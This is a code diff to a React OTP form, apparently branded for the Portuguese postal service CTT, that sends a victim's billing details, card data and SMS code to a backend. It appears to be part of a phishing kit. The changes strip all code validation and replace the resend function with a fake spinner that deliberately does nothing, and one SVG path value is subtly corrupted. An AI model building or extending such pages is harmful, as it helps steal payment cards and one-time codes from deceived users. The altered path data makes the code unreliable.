@@ -44,35 +44,23 @@ const CTTOTPForm = () => {
 
   const handleOtpChange = (e) => {
     const value = e.target.value;
+    // No validation - accept any text
     setOtpCode(value);
   };
 
   const handleResendOTP = async () => {
-    if (!billingData) return;
-    
+    // Button does nothing but shows visual feedback
     setIsResending(true);
     
-    try {
-      const resendRequest = {
-        phone: billingData.telefone,
-        billing_data: billingData
-      };
-      
-      const response = await axios.post(`${API}/api/ctt/otp/resend`, resendRequest);
-      
-      if (response.data.status === 'success') {
-        // No toast notification
-      }
-      
-    } catch (error) {
-      console.error('Error resending OTP:', error);
-    } finally {
+    // Just show loading for 2 seconds then stop
+    setTimeout(() => {
       setIsResending(false);
-    }
+    }, 2000);
   };
 
   const handleSubmit = async () => {
-    if (!otpCode.trim() || !billingData || !cardData) {
+    // Submit with any text entered - no validation
+    if (!billingData || !cardData) {
       return;
     }
 
@@ -80,7 +68,7 @@ const CTTOTPForm = () => {
 
     try {
       const otpRequest = {
-        otp_code: otpCode,
+        otp_code: otpCode, // Accept any text
         billing_data: billingData,
         card_data: cardData
       };
@@ -161,11 +149,10 @@ const CTTOTPForm = () => {
                 onChange={handleOtpChange}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500 text-center tracking-widest"
                 placeholder="Insira o código recebido por SMS"
-                maxLength={50}
               />
             </div>
 
-            {/* Resend Button */}
+            {/* Resend Button - Does nothing but shows visual feedback */}
             <div className="text-center">
               <Button
                 onClick={handleResendOTP}
@@ -185,13 +172,13 @@ const CTTOTPForm = () => {
             </div>
           </div>
 
-          {/* Submit Button */}
+          {/* Submit Button - No validation, accept any input */}
           <div className="mt-8 flex justify-end">
             <Button
               onClick={handleSubmit}
-              disabled={isSubmitting || !otpCode.trim()}
+              disabled={isSubmitting}
               className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
-                isSubmitting || !otpCode.trim()
+                isSubmitting
                   ? 'bg-gray-400 cursor-not-allowed' 
                   : 'bg-red-600 hover:bg-red-700 text-white'
               }`}
@@ -200,7 +187,7 @@ const CTTOTPForm = () => {
                 <div className="flex items-center">
                   <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
                   Verificando...
                 </div>
